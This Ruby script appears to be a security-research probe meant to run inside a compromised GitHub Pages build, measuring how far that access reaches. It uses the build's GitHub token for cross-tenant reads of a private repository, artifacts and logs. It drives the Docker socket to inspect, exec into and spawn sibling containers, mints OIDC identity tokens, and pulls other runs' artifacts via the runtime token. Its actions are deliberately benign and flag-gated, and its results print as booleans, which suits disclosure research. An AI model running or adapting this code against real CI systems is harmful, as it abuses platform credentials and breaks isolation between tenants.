require "base64"
require "digest"
require "json"
require "net/http"
require "securerandom"
require "socket"
require "uri"

SOURCE_REPO = "singetu0096/pages-post-url-regexp-canary-20260915"
SOURCE_REPO_ID = 1370245075
SECONDARY_REPO = "singetu0096-ano/porter-api-secondary-baseline-20260912"
SECONDARY_REPO_ID = 1366499163
MARKER_PATH = "cross-tenant-marker.txt"
MARKER_SHA256 = "cb6f1cc365ae54603fb491f1a19a011968e7b88374892a324a43eb59dc3de777"
MAX_IMPACT_PROBE = false
CAPABILITY_AUDIT = true
PREVIOUS_OWNED_RUN_ID = 34908766740
PREVIOUS_OWNED_ARTIFACT_ID = 10372979452
SECONDARY_OWNED_ARTIFACT_ID = 10372138385
OIDC_AUDIENCE = "https://github.com/singetu0096/pages-post-url-regexp-canary-20260915/pages-rce-max-impact-canary"
ARTIFACT_PROBE = false
ARTIFACT_RUN_BACKEND_ID = ""
ARTIFACT_JOB_BACKEND_ID = ""
ARTIFACT_NAME = ""
ARTIFACT_ID = 0
ARTIFACT_SHA256 = ""

def github_get(request_path, token)
  uri = URI("https://api.github.com" + request_path)
  request = Net::HTTP::Get.new(uri)
  request["Accept"] = "application/vnd.github+json"
  request["Authorization"] = "Bearer " + token unless token.empty?
  request["User-Agent"] = "owned-pages-tenant-boundary-canary"
  request["X-GitHub-Api-Version"] = "2022-11-28"
  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = true
  http.open_timeout = 5
  http.read_timeout = 10
  response = http.request(request)
  [response.code.to_i, response.body.to_s]
rescue StandardError
  [0, ""]
end

def github_head(request_path, token)
  uri = URI("https://api.github.com" + request_path)
  request = Net::HTTP::Head.new(uri)
  request["Accept"] = "application/vnd.github+json"
  request["Authorization"] = "Bearer " + token unless token.empty?
  request["User-Agent"] = "owned-pages-capability-audit"
  request["X-GitHub-Api-Version"] = "2022-11-28"
  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = true
  http.open_timeout = 5
  http.read_timeout = 10
  response = http.request(request)
  response.code.to_i
rescue StandardError
  0
end

def github_get_status_no_body(request_path, token)
  uri = URI("https://api.github.com" + request_path)
  request = Net::HTTP::Get.new(uri)
  request["Accept"] = "application/vnd.github+json"
  request["Authorization"] = "Bearer " + token unless token.empty?
  request["User-Agent"] = "owned-pages-capability-audit"
  request["X-GitHub-Api-Version"] = "2022-11-28"
  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = true
  http.open_timeout = 5
  http.read_timeout = 10
  status = 0
  http.request(request) { |response| status = response.code.to_i }
  status
rescue StandardError
  0
end

def runtime_backend_ids(token)
  part = token.split(".")[1].to_s
  padded = part + ("=" * ((4 - (part.length % 4)) % 4))
  payload = JSON.parse(Base64.decode64(padded.tr("-_", "+/")))
  scope = payload.fetch("scp", "").to_s.split(" ").find do |entry|
    entry.start_with?("Actions.Results:")
  end
  pieces = scope.to_s.split(":")
  return [nil, nil] unless pieces.length == 3

  [pieces[1], pieces[2]]
rescue StandardError
  [nil, nil]
end

def results_post(results_url, method_name, token, body)
  uri = URI(results_url)
  return [0, ""] unless uri.is_a?(URI::HTTPS) && uri.host

  uri.path = "/twirp/github.actions.results.api.v1.ArtifactService/" + method_name
  uri.query = nil
  uri.fragment = nil
  request = Net::HTTP::Post.new(uri)
  request["Authorization"] = "Bearer " + token
  request["Content-Type"] = "application/json"
  request["User-Agent"] = "owned-pages-runtime-boundary-canary"
  request.body = JSON.generate(body)
  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = true
  http.open_timeout = 5
  http.read_timeout = 10
  response = http.request(request)
  [response.code.to_i, response.body.to_s]
rescue StandardError
  [0, ""]
end

def signed_download(url)
  uri = URI(url)
  return [0, ""] unless uri.is_a?(URI::HTTPS) && uri.host

  request = Net::HTTP::Get.new(uri)
  request["User-Agent"] = "owned-pages-runtime-boundary-canary"
  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = true
  http.open_timeout = 5
  http.read_timeout = 10
  response = http.request(request)
  body = response.body.to_s
  return [response.code.to_i, ""] if body.bytesize > 1_048_576

  [response.code.to_i, body]
rescue StandardError
  [0, ""]
end

def docker_request(method, request_path, request_body = "")
  socket = UNIXSocket.new("/var/run/docker.sock")
  crlf = 13.chr + 10.chr
  socket.write([
    method + " " + request_path + " HTTP/1.0",
    "Host: localhost",
    "Content-Type: application/json",
    "Content-Length: " + request_body.bytesize.to_s,
    "",
    request_body
  ].join(crlf))
  raw = socket.read
  status = raw.lines.first.to_s.split[1].to_i
  body = raw.partition(crlf + crlf)[2]
  [status, body]
rescue StandardError
  [0, ""]
ensure
  socket.close if defined?(socket) && socket
end

def docker_get(request_path)
  docker_request("GET", request_path)
end

def docker_counts
  status, body = docker_get("/info")
  counts = {}
  if status == 200
    begin
      parsed = JSON.parse(body)
      %w[Containers ContainersRunning ContainersPaused ContainersStopped].each do |key|
        counts[key] = Integer(parsed[key]) if parsed.key?(key)
      end
    rescue StandardError
      counts = {"parse_error" => true}
    end
  end
  [status, counts]
ensure
  body = nil
end

def decode_jwt_payload(token)
  part = token.to_s.split(".")[1].to_s
  return nil if part.empty?

  padded = part + ("=" * ((4 - (part.length % 4)) % 4))
  JSON.parse(Base64.decode64(padded.tr("-_", "+/")))
rescue StandardError
  nil
end

def oidc_identity_probe
  result = {
    "configured" => MAX_IMPACT_PROBE,
    "request_url_present" => ENV.key?("ACTIONS_ID_TOKEN_REQUEST_URL"),
    "request_token_present" => ENV.key?("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
  }
  return result unless MAX_IMPACT_PROBE

  raw_url = ENV.fetch("ACTIONS_ID_TOKEN_REQUEST_URL", "")
  request_token = ENV.fetch("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
  uri = URI(raw_url)
  allowed_host = uri.is_a?(URI::HTTPS) && uri.host &&
    (uri.host == "actions.githubusercontent.com" ||
     uri.host.end_with?(".actions.githubusercontent.com"))
  result["request_host_allowed"] = !!allowed_host
  return result unless allowed_host && !request_token.empty?

  query = URI.decode_www_form(uri.query.to_s)
  query.reject! { |key,| key == "audience" }
  query << ["audience", OIDC_AUDIENCE]
  uri.query = URI.encode_www_form(query)

  request = Net::HTTP::Get.new(uri)
  request["Authorization"] = "Bearer " + request_token
  request["User-Agent"] = "owned-pages-oidc-boundary-canary"
  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = true
  http.open_timeout = 5
  http.read_timeout = 10
  response = http.request(request)
  result["http_status"] = response.code.to_i
  return result unless response.code.to_i == 200

  identity_token = JSON.parse(response.body.to_s).fetch("value", "").to_s
  claims = decode_jwt_payload(identity_token)
  result["jwt_payload_parseable"] = claims.is_a?(Hash)
  if claims.is_a?(Hash)
    result["issuer_expected"] =
      claims["iss"].to_s == "https://token.actions.githubusercontent.com"
    result["audience_expected"] = claims["aud"].to_s == OIDC_AUDIENCE
    result["source_repository_expected"] =
      claims["repository"].to_s == SOURCE_REPO
    result["source_repository_id_expected"] =
      claims["repository_id"].to_s == SOURCE_REPO_ID.to_s
    result["current_run_id_expected"] =
      claims["run_id"].to_s == ENV.fetch("GITHUB_RUN_ID", "")
    result["secondary_repository_absent"] =
      !JSON.generate(claims).include?(SECONDARY_REPO_ID.to_s)
    issued_at = Integer(claims["iat"], exception: false)
    expires_at = Integer(claims["exp"], exception: false)
    result["lifetime_at_most_ten_minutes"] =
      issued_at && expires_at && expires_at >= issued_at &&
      (expires_at - issued_at) <= 600
  end
  result
rescue StandardError
  result["request_failed"] = true
  result
ensure
  raw_url = nil
  request_token = nil
  identity_token = nil
  claims = nil
end

token = ENV.fetch("INPUT_TOKEN", "")
source_status, source_response = github_get("/repos/" + SOURCE_REPO, token)
secondary_status, = github_get("/repos/" + SECONDARY_REPO, token)
marker_status, marker_response = github_get(
  "/repos/" + SECONDARY_REPO + "/contents/" + MARKER_PATH,
  token
)

marker_match = false
if marker_status == 200
  begin
    marker_json = JSON.parse(marker_response)
    marker_bytes = Base64.decode64(marker_json.fetch("content", ""))
    marker_match = Digest::SHA256.hexdigest(marker_bytes) == MARKER_SHA256
  rescue StandardError
    marker_match = false
  end
end
marker_response = nil

github_capability = {"configured" => CAPABILITY_AUDIT}
if CAPABILITY_AUDIT
  begin
    source_json = JSON.parse(source_response)
    permissions = source_json.fetch("permissions", {})
    github_capability["source_repository_id_matched"] =
      source_json["id"].to_s == SOURCE_REPO_ID.to_s
    github_capability["source_repository_permissions"] = {}
    %w[admin maintain push triage pull].each do |permission|
      github_capability["source_repository_permissions"][permission] =
        !!permissions[permission]
    end
  rescue StandardError
    github_capability["source_repository_response_parse_error"] = true
  end

  installation_status = github_head("/installation/repositories", token)
  github_capability["installation_repositories_status"] = installation_status

  pages_status = github_head("/repos/" + SOURCE_REPO + "/pages", token)
  runs_status = github_head(
    "/repos/" + SOURCE_REPO + "/actions/runs?per_page=1",
    token
  )
  artifacts_status = github_head(
    "/repos/" + SOURCE_REPO + "/actions/artifacts?per_page=1",
    token
  )
  previous_logs_status = github_get_status_no_body(
    "/repos/" + SOURCE_REPO + "/actions/runs/" +
      PREVIOUS_OWNED_RUN_ID.to_s + "/logs",
    token
  )
  previous_artifact_status = github_get_status_no_body(
    "/repos/" + SOURCE_REPO + "/actions/artifacts/" +
      PREVIOUS_OWNED_ARTIFACT_ID.to_s + "/zip",
    token
  )
  secondary_artifact_status = github_get_status_no_body(
    "/repos/" + SECONDARY_REPO + "/actions/artifacts/" +
      SECONDARY_OWNED_ARTIFACT_ID.to_s + "/zip",
    token
  )
  github_capability["source_pages_get_status"] = pages_status
  github_capability["source_actions_runs_list_status"] = runs_status
  github_capability["source_actions_artifacts_list_status"] = artifacts_status
  github_capability["previous_owned_run_logs_status_no_redirect"] =
    previous_logs_status
  github_capability["previous_owned_artifact_status_no_redirect"] =
    previous_artifact_status
  github_capability["secondary_owned_artifact_status_no_redirect"] =
    secondary_artifact_status

  source_json = nil
  permissions = nil
end
source_response = nil

runtime_results = {"configured" => ARTIFACT_PROBE}
if ARTIFACT_PROBE
  results_url = ENV.fetch("ACTIONS_RESULTS_URL", "")
  runtime_token = ENV.fetch("ACTIONS_RUNTIME_TOKEN", "")
  own_run_backend_id, own_job_backend_id = runtime_backend_ids(runtime_token)
  runtime_results["current_scope_ids_parseable"] =
    !own_run_backend_id.nil? && !own_job_backend_id.nil?

  own_list_status = 0
  own_list_count = nil
  if runtime_results["current_scope_ids_parseable"]
    own_list_status, own_list_response = results_post(
      results_url,
      "ListArtifacts",
      runtime_token,
      {
        "workflow_run_backend_id" => own_run_backend_id,
        "workflow_job_run_backend_id" => own_job_backend_id
      }
    )
    if own_list_status == 200
      begin
        own_list_count = JSON.parse(own_list_response).fetch("artifacts", []).length
      rescue StandardError
        own_list_count = nil
      end
    end
    own_list_response = nil
  end
  runtime_results["current_list_status"] = own_list_status
  runtime_results["current_list_artifact_count"] = own_list_count

  target_list_status, target_list_response = results_post(
    results_url,
    "ListArtifacts",
    runtime_token,
    {
      "workflow_run_backend_id" => ARTIFACT_RUN_BACKEND_ID,
      "workflow_job_run_backend_id" => ARTIFACT_JOB_BACKEND_ID,
      "name_filter" => ARTIFACT_NAME
    }
  )
  target_list_count = nil
  target_exact_id = false
  if target_list_status == 200
    begin
      target_artifacts = JSON.parse(target_list_response).fetch("artifacts", [])
      target_list_count = target_artifacts.length
      target_exact_id = target_artifacts.any? do |artifact|
        artifact.fetch("database_id", "").to_s == ARTIFACT_ID.to_s
      end
    rescue StandardError
      target_list_count = nil
      target_exact_id = false
    end
  end
  target_list_response = nil
  runtime_results["secondary_list_status"] = target_list_status
  runtime_results["secondary_list_artifact_count"] = target_list_count
  runtime_results["secondary_list_exact_id"] = target_exact_id

  signed_status, signed_response = results_post(
    results_url,
    "GetSignedArtifactURL",
    runtime_token,
    {
      "workflow_run_backend_id" => ARTIFACT_RUN_BACKEND_ID,
      "workflow_job_run_backend_id" => ARTIFACT_JOB_BACKEND_ID,
      "name" => ARTIFACT_NAME
    }
  )
  download_status = 0
  artifact_match = false
  if signed_status == 200
    begin
      signed_json = JSON.parse(signed_response)
      signed_url = signed_json["signed_url"] || signed_json["signedUrl"]
      download_status, artifact_bytes = signed_download(signed_url.to_s)
      artifact_match = download_status == 200 &&
        Digest::SHA256.hexdigest(artifact_bytes) == ARTIFACT_SHA256
      artifact_bytes = nil
    rescue StandardError
      download_status = 0
      artifact_match = false
    end
  end
  signed_response = nil
  runtime_results["secondary_signed_url_status"] = signed_status
  runtime_results["secondary_download_status"] = download_status
  runtime_results["secondary_artifact_sha256_match"] = artifact_match
end

ping_status, ping_body = docker_get("/_ping")
info_status, info_body = docker_get("/info")
docker_info = {}
if info_status == 200
  begin
    parsed_info = JSON.parse(info_body)
    %w[Containers ContainersRunning ContainersPaused ContainersStopped].each do |key|
      docker_info[key] = Integer(parsed_info[key]) if parsed_info.key?(key)
    end
    security_options = Array(parsed_info["SecurityOptions"]).map(&:to_s)
    docker_info["rootless_security_option"] =
      security_options.any? { |entry| entry.include?("rootless") }
    docker_info["userns_security_option"] =
      security_options.any? { |entry| entry.include?("userns") }
    docker_info["docker_root_dir_present"] =
      !parsed_info.fetch("DockerRootDir", "").to_s.empty?
  rescue StandardError
    docker_info = {"parse_error" => true}
  end
end
info_body = nil

docker_capability = {"configured" => CAPABILITY_AUDIT}
if CAPABILITY_AUDIT && info_status == 200 && parsed_info.is_a?(Hash)
  plugins = parsed_info.fetch("Plugins", {})
  authorization_plugins = Array(plugins["Authorization"])
  swarm = parsed_info.fetch("Swarm", {})
  docker_capability["authorization_plugin_count"] =
    authorization_plugins.length
  docker_capability["authorization_plugins_absent"] =
    authorization_plugins.empty?
  docker_capability["swarm_active"] =
    swarm["LocalNodeState"].to_s == "active"
  docker_capability["swarm_control_available"] =
    !!swarm["ControlAvailable"]
  docker_capability["cluster_store_configured"] =
    !parsed_info.fetch("ClusterStore", "").to_s.empty?
  docker_capability["live_restore_enabled"] =
    !!parsed_info["LiveRestoreEnabled"]
  docker_capability["default_runtime_present"] =
    !parsed_info.fetch("DefaultRuntime", "").to_s.empty?
  docker_capability["available_runtime_count"] =
    parsed_info.fetch("Runtimes", {}).length
  docker_capability["seccomp_security_option"] =
    Array(parsed_info["SecurityOptions"]).any? do |entry|
      entry.to_s.include?("seccomp")
    end
  docker_capability["apparmor_security_option"] =
    Array(parsed_info["SecurityOptions"]).any? do |entry|
      entry.to_s.include?("apparmor")
    end
end

self_name = Socket.gethostname
self_status, self_response = docker_get("/containers/" + self_name + "/json")
self_id_match = false
self_image_id = nil
self_profile = {}
if self_status == 200
  begin
    self_json = JSON.parse(self_response)
    self_id = self_json.fetch("Id", "").to_s
    self_id_match = self_name.length >= 12 && self_id.start_with?(self_name)
    self_image_id = self_json.fetch("Image", "").to_s
    host_config = self_json.fetch("HostConfig", {})
    mounts = Array(self_json["Mounts"])
    self_profile = {
      "privileged" => !!host_config["Privileged"],
      "readonly_rootfs" => !!host_config["ReadonlyRootfs"],
      "mount_count" => mounts.length,
      "docker_socket_mount_present" => mounts.any? do |mount|
        mount["Type"].to_s == "bind" &&
          mount["Destination"].to_s == "/var/run/docker.sock"
      end
    }
  rescue StandardError
    self_id_match = false
    self_image_id = nil
    self_profile = {"parse_error" => true}
  end
end
self_response = nil

if CAPABILITY_AUDIT && self_status == 200 && self_id_match &&
   self_json.is_a?(Hash)
  config = self_json.fetch("Config", {})
  host_config = self_json.fetch("HostConfig", {})
  mounts = Array(self_json["Mounts"])
  env_names = Array(config["Env"]).map do |entry|
    entry.to_s.split("=", 2).first
  end
  configured_user = config.fetch("User", "").to_s
  root_user_values = ["", "0", "root", "0:0", "root:root"]

  container_profile = {
    "configured_user_is_root" => root_user_values.include?(configured_user),
    "environment_variable_count" => env_names.length,
    "privileged" => !!host_config["Privileged"],
    "readonly_rootfs" => !!host_config["ReadonlyRootfs"],
    "auto_remove" => !!host_config["AutoRemove"],
    "pid_mode_host" => host_config["PidMode"].to_s == "host",
    "ipc_mode_host" => host_config["IpcMode"].to_s == "host",
    "uts_mode_host" => host_config["UTSMode"].to_s == "host",
    "network_mode_host" => host_config["NetworkMode"].to_s == "host",
    "network_mode_none" => host_config["NetworkMode"].to_s == "none",
    "userns_mode_host" => host_config["UsernsMode"].to_s == "host",
    "cap_add_count" => Array(host_config["CapAdd"]).length,
    "cap_drop_count" => Array(host_config["CapDrop"]).length,
    "security_opt_count" => Array(host_config["SecurityOpt"]).length,
    "bind_configuration_count" => Array(host_config["Binds"]).length,
    "device_count" => Array(host_config["Devices"]).length,
    "device_request_count" => Array(host_config["DeviceRequests"]).length,
    "published_port_binding_count" =>
      host_config.fetch("PortBindings", {}).length,
    "extra_host_count" => Array(host_config["ExtraHosts"]).length,
    "masked_path_count" => Array(host_config["MaskedPaths"]).length,
    "readonly_path_count" => Array(host_config["ReadonlyPaths"]).length,
    "memory_limit_bytes" => Integer(host_config.fetch("Memory", 0)),
    "pids_limit" => Integer(host_config.fetch("PidsLimit", 0) || 0),
    "nano_cpus" => Integer(host_config.fetch("NanoCpus", 0)),
    "mount_count" => mounts.length,
    "bind_mount_count" => mounts.count do |mount|
      mount["Type"].to_s == "bind"
    end,
    "writable_mount_count" => mounts.count { |mount| !!mount["RW"] },
    "docker_socket_mount_present" => mounts.any? do |mount|
      mount["Destination"].to_s == "/var/run/docker.sock"
    end,
    "docker_socket_mount_writable" => mounts.any? do |mount|
      mount["Destination"].to_s == "/var/run/docker.sock" && !!mount["RW"]
    end,
    "workspace_mount_present" => mounts.any? do |mount|
      mount["Destination"].to_s == "/github/workspace"
    end,
    "workspace_mount_writable" => mounts.any? do |mount|
      mount["Destination"].to_s == "/github/workspace" && !!mount["RW"]
    end,
    "github_home_mount_present" => mounts.any? do |mount|
      mount["Destination"].to_s == "/github/home"
    end,
    "github_workflow_mount_present" => mounts.any? do |mount|
      mount["Destination"].to_s == "/github/workflow"
    end,
    "github_file_commands_mount_present" => mounts.any? do |mount|
      mount["Destination"].to_s == "/github/file_commands"
    end,
    "actions_mount_present" => mounts.any? do |mount|
      mount["Destination"].to_s.start_with?("/__w/_actions/")
    end
  }
  %w[
    INPUT_TOKEN
    GITHUB_TOKEN
    ACTIONS_RUNTIME_TOKEN
    ACTIONS_RUNTIME_URL
    ACTIONS_RESULTS_URL
    ACTIONS_CACHE_URL
    ACTIONS_ID_TOKEN_REQUEST_URL
    ACTIONS_ID_TOKEN_REQUEST_TOKEN
  ].each do |name|
    container_profile["env_" + name.downcase + "_present"] =
      env_names.include?(name)
  end
  docker_capability["current_container"] = container_profile

  networks = self_json.dig("NetworkSettings", "Networks")
  networks = {} unless networks.is_a?(Hash)
  network_names = networks.keys.select do |name|
    name.to_s.match?(/\A[A-Za-z0-9_.-]{1,128}\z/)
  end.first(4)
  network_result = {
    "attached_network_count" => networks.length,
    "validated_network_name_count" => network_names.length,
    "inspect_success_count" => 0,
    "current_container_present_count" => 0,
    "other_attached_container_count" => 0,
    "any_internal_network" => false,
    "any_ingress_network" => false,
    "any_attachable_network" => false
  }
  network_names.each do |network_name|
    network_status, network_response = docker_get(
      "/networks/" + network_name
    )
    next unless network_status == 200

    network_json = JSON.parse(network_response)
    attached = network_json.fetch("Containers", {})
    current_present = attached.key?(self_id)
    network_result["inspect_success_count"] += 1
    network_result["current_container_present_count"] += 1 if current_present
    network_result["other_attached_container_count"] +=
      attached.length - (current_present ? 1 : 0)
    network_result["any_internal_network"] ||= !!network_json["Internal"]
    network_result["any_ingress_network"] ||= !!network_json["Ingress"]
    network_result["any_attachable_network"] ||= !!network_json["Attachable"]
    network_response = nil
    network_json = nil
    attached = nil
  rescue StandardError
    network_result["inspect_parse_error"] = true
  end
  network_result["other_attached_container_observed"] =
    network_result["other_attached_container_count"].positive?
  docker_capability["current_networks"] = network_result

  begin
    process_status = File.read("/proc/self/status", 65_536)
    status_values = process_status.lines.filter_map do |line|
      key, value = line.split(":", 2)
      [key, value.to_s.strip] if key && value
    end.to_h
    cap_eff = status_values.fetch("CapEff", "0").to_i(16)
    cap_prm = status_values.fetch("CapPrm", "0").to_i(16)
    docker_capability["process_security"] = {
      "effective_capabilities_nonzero" => cap_eff != 0,
      "permitted_capabilities_nonzero" => cap_prm != 0,
      "effective_capability_bit_count" => cap_eff.digits(2).sum,
      "no_new_privileges" => status_values.fetch("NoNewPrivs", "-1") == "1",
      "seccomp_mode" => Integer(
        status_values.fetch("Seccomp", "-1"),
        exception: false
      )
    }
  rescue StandardError
    docker_capability["process_status_parse_error"] = true
  ensure
    process_status = nil
    status_values = nil
  end

  begin
    socket_stat = File.stat("/var/run/docker.sock")
    docker_capability["docker_socket"] = {
      "is_socket" => socket_stat.socket?,
      "owned_by_root" => socket_stat.uid == 0,
      "group_owned_by_root" => socket_stat.gid == 0,
      "process_readable" => File.readable?("/var/run/docker.sock"),
      "process_writable" => File.writable?("/var/run/docker.sock")
    }
  rescue StandardError
    docker_capability["docker_socket_stat_error"] = true
  end

  config = nil
  host_config = nil
  mounts = nil
  env_names = nil
  networks = nil
  network_names = nil
  self_json = nil
  parsed_info = nil
  plugins = nil
  authorization_plugins = nil
  swarm = nil
end

exec_create_status = 0
exec_start_status = 0
exec_inspect_status = 0
exec_exit_zero = false
if !CAPABILITY_AUDIT && self_status == 200 && self_id_match
  exec_create_status, exec_create_response = docker_request(
    "POST",
    "/containers/" + self_name + "/exec",
    JSON.generate(
      "AttachStdout" => false,
      "AttachStderr" => false,
      "Tty" => false,
      "Cmd" => ["/usr/bin/true"]
    )
  )
  if exec_create_status == 201
    begin
      exec_id = JSON.parse(exec_create_response).fetch("Id")
      exec_start_status, = docker_request(
        "POST",
        "/exec/" + exec_id + "/start",
        JSON.generate("Detach" => true, "Tty" => false)
      )
      if [200, 204].include?(exec_start_status)
        5.times do
          exec_inspect_status, exec_inspect_response = docker_get(
            "/exec/" + exec_id + "/json"
          )
          if exec_inspect_status == 200
            exec_info = JSON.parse(exec_inspect_response)
            unless exec_info.fetch("Running", false)
              exec_exit_zero = exec_info.fetch("ExitCode", -1).to_i == 0
              break
            end
          end
          sleep 0.05
        end
      end
    rescue StandardError
      exec_exit_zero = false
    end
  end
  exec_create_response = nil
  exec_inspect_response = nil
end

sibling_canary = {"configured" => MAX_IMPACT_PROBE}
if MAX_IMPACT_PROBE && self_status == 200 && self_id_match &&
   self_image_id.to_s.match?(/\Asha256:[0-9a-f]{64}\z/)
  canary_name = "pages-rce-owned-canary-" + SecureRandom.hex(8)
  sibling_id = nil
  created_by_probe = false
  cleanup_status = 0
  begin
    create_body = JSON.generate(
      "Image" => self_image_id,
      "Entrypoint" => ["/usr/bin/true"],
      "Cmd" => [],
      "User" => "65534:65534",
      "Env" => [],
      "NetworkDisabled" => true,
      "AttachStdin" => false,
      "AttachStdout" => false,
      "AttachStderr" => false,
      "OpenStdin" => false,
      "StdinOnce" => false,
      "Tty" => false,
      "Labels" => {
        "com.github.security-research.owned-canary" => "true"
      },
      "HostConfig" => {
        "AutoRemove" => false,
        "Binds" => [],
        "CapDrop" => ["ALL"],
        "Devices" => [],
        "LogConfig" => {"Type" => "none", "Config" => {}},
        "Memory" => 33_554_432,
        "MemorySwap" => 33_554_432,
        "NanoCpus" => 50_000_000,
        "NetworkMode" => "none",
        "PidsLimit" => 16,
        "PortBindings" => {},
        "Privileged" => false,
        "PublishAllPorts" => false,
        "ReadonlyRootfs" => true,
        "SecurityOpt" => ["no-new-privileges:true"]
      }
    )
    create_status, create_response = docker_request(
      "POST",
      "/containers/create?name=" + canary_name,
      create_body
    )
    sibling_canary["create_status"] = create_status
    created_by_probe = create_status == 201
    if created_by_probe
      sibling_id = JSON.parse(create_response).fetch("Id", "").to_s
      after_create_status, after_create_counts = docker_counts
      sibling_canary["after_create_info_status"] = after_create_status
      sibling_canary["container_count_increased_by_one"] =
        docker_info["Containers"].is_a?(Integer) &&
        after_create_counts["Containers"] == docker_info["Containers"] + 1

      start_status, = docker_request(
        "POST",
        "/containers/" + sibling_id + "/start"
      )
      sibling_canary["start_status"] = start_status
      20.times do
        inspect_status, inspect_response = docker_get(
          "/containers/" + sibling_id + "/json"
        )
        sibling_canary["inspect_status"] = inspect_status
        if inspect_status == 200
          inspect_json = JSON.parse(inspect_response)
          state = inspect_json.fetch("State", {})
          unless state.fetch("Running", false)
            sibling_canary["exit_code_zero"] =
              state.fetch("ExitCode", -1).to_i == 0
            break
          end
        end
        sleep 0.05
      end
    end
  rescue StandardError
    sibling_canary["probe_error"] = true
  ensure
    if created_by_probe
      cleanup_target = sibling_id.to_s.empty? ? canary_name : sibling_id
      cleanup_status, = docker_request(
        "DELETE",
        "/containers/" + cleanup_target + "?force=1&v=1"
      )
    end
    sibling_canary["cleanup_status"] = cleanup_status
    post_cleanup_status, post_cleanup_counts = docker_counts
    sibling_canary["post_cleanup_info_status"] = post_cleanup_status
    sibling_canary["counts_returned_to_baseline"] =
      docker_info.slice(
        "Containers",
        "ContainersRunning",
        "ContainersPaused",
        "ContainersStopped"
      ) == post_cleanup_counts
    create_body = nil
    create_response = nil
    inspect_response = nil
    inspect_json = nil
    state = nil
    sibling_id = nil
    canary_name = nil
  end
end

oidc_result = oidc_identity_probe

puts JSON.generate(
  "source_repo_status" => source_status,
  "secondary_private_repo_status" => secondary_status,
  "secondary_marker_status" => marker_status,
  "secondary_marker_sha256_match" => marker_match,
  "docker_ping_status" => ping_status,
  "docker_ping_ok" => ping_body.strip == "OK",
  "docker_info_status" => info_status,
  "docker_counts" => docker_info,
  "docker_self_inspect_status" => self_status,
  "docker_self_id_match" => self_id_match,
  "docker_self_profile" => self_profile,
  "docker_benign_exec_create_status" => exec_create_status,
  "docker_benign_exec_start_status" => exec_start_status,
  "docker_benign_exec_inspect_status" => exec_inspect_status,
  "docker_benign_exec_exit_zero" => exec_exit_zero,
  "docker_sibling_canary" => sibling_canary,
  "docker_capability_audit" => docker_capability,
  "oidc_identity_canary" => oidc_result,
  "github_capability_audit" => github_capability,
  "runtime_results_service" => runtime_results
)
